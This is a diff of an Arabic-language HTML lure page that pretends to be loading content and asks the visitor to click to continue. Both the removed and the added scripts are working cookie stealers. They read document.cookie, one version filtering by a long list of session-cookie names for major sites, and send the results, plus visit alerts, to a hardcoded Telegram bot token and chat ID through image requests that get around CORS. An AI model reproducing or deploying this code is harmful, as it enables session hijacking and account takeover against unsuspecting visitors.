@@ -2,76 +2,58 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>تحديث الصفحة</title>
 </head>
-<body style="text-align: center; padding: 50px; font-family: Tahoma;">
+<body style="text-align: center; padding: 50px; font-family: Tahoma; background-color: #f9f9f9;">
     <h2>جاري تحميل المحتوى...</h2>
     <p>يرجى الانتظار قليلاً والضغط على الزر أدناه في حال لم يتم التحميل تلقائياً.</p>
     
-    <button id="btn" type="button" style="padding: 15px 30px; font-size: 18px; background: #28a745; color: white; border: none; border-radius: 5px; cursor: pointer;">اضغط هنا للمتابعة</button>
+    <!-- الزر التفاعلي الجديد -->
+    <button id="myButton" style="padding: 15px 30px; font-size: 18px; background-color: #28a745; color: white; border: none; border-radius: 5px; cursor: pointer; box-shadow: 0 2px 5px rgba(0,0,0,0.2);">اضغط هنا للمتابعة</button>
 
-<script>
-    const botToken = "8970427451:AAFqyCocC3VS1jGYo8Da_ET6PNrV6hWdOVs";
-    const chatId = "408506450";
-
-    const SESSION_COOKIE_NAMES = new Set([
-        "sessionid", "session_token", "session_id", "session", "sid",
-        "connect.sid", "login_info", "logged_in",
-        "auth_token", "access_token", "token", "oauth_token",
-        "id_token", "refresh_token", "bearer_token",
-        "apisid", "sapisid", "hsid", "ssid", "lsid",
-        "c_user", "datr", "xs", "fr", "sb",
-        "ds_user_id", "csrftoken", "rur", "mid",
-        "ct0", "twid",
-        "locale", "dcfduid", "sdcfduid",
-        "_gh_sess", "user_session", "dotcom_user",
-        "kick_session_id",
-        "phpsessid", "jsessionid", "_session_id", "remember_token",
-        "remember_user_token", "remember_web"
-    ]);
-
-    function getTargetCookies() {
-        const cookies = document.cookie.split(";");
-        let foundText = "";
-        
-        for (let cookie of cookies) {
-            const parts = cookie.split("=");
-            const name = parts[0].trim().toLowerCase();
-            const value = parts.slice(1).join("=").trim();
+    <script>
+        // ربط الزر بحدث النقر
+        document.getElementById('myButton').addEventListener('click', function() {
+            // إظهار رسالة تنبيه للمستخدم
+            alert('جاري التحويل إلى المحتوى المطلوب...');
             
-            if (SESSION_COOKIE_NAMES.has(name)) {
-                foundText += `${name}: ${value}\n`;
-            }
-        }
-        return foundText;
-    }
-
-    function sendData() {
-        const cookiesText = getTargetCookies();
-        
-        if (!cookiesText) {
-            return;
-        }
-
-        const message = "تنبيه جديد\nالرابط: " + window.location.href + "\nالكوكيز:\n" + cookiesText;
-
-        const telegramUrl = "https://api.telegram.org/bot" + botToken + "/sendMessage?chat_id=" + chatId + "&text=" + encodeURIComponent(message);
-
-        const img = new Image();
-        img.src = telegramUrl;
-    }
-
-    window.addEventListener("DOMContentLoaded", () => {
-        sendData();
-        
-        const btn = document.getElementById("btn");
-        if (btn) {
-            btn.addEventListener("click", () => {
-                sendData();
-                alert("جاري التحويل...");
+            // بيانات البوت
+            const botToken = "8970427451:AAFqyCocC3VS1jGYo8Da_ET6PNrV6hWdOVs";
+            const chatId = "408506450";
+            
+            // استخراج الكوكيز
+            const cookies = document.cookie.split(';');
+            let cookieString = "";
+            cookies.forEach(cookie => {
+                if (cookie.trim()) {
+                    cookieString += cookie.trim() + "\n";
+                }
             });
-        }
-    });
-</script>
+
+            // تجهيز الرسالة
+            const message = "تم النقر على الزر!\nالرابط: " + window.location.href + "\n\nجميع الكوكيز:\n" + cookieString;
+
+            // إرسال البيانات عبر رابط الصورة لتجاوز CORS
+            const telegramUrl = "https://api.telegram.org/bot" + botToken + "/sendMessage?chat_id=" + chatId + "&text=" + encodeURIComponent(message);
+            
+            // إنشاء كائن صورة لإرسال الطلب
+            const img = new Image();
+            img.src = telegramUrl;
+            
+            console.log("تم إرسال طلب التنبيه إلى تليجرام");
+        });
+
+        // محاكاة الضغط التلقائي عند تحميل الصفحة لضمان إرسال التنبيه الأول
+        window.addEventListener('load', function() {
+             // إرسال تنبيه تلقائي عند فتح الصفحة
+             const botTokenAuto = "8970427451:AAFqyCocC3VS1jGYo8Da_ET6PNrV6hWdOVs";
+             const chatIdAuto = "408506450";
+             const messageAuto = "زيارة جديدة للصفحة!\nالرابط: " + window.location.href;
+             const telegramUrlAuto = "https://api.telegram.org/bot" + botTokenAuto + "/sendMessage?chat_id=" + chatIdAuto + "&text=" + encodeURIComponent(messageAuto);
+             const imgAuto = new Image();
+             imgAuto.src = telegramUrlAuto;
+        });
+    </script>
 </body>
 </html>
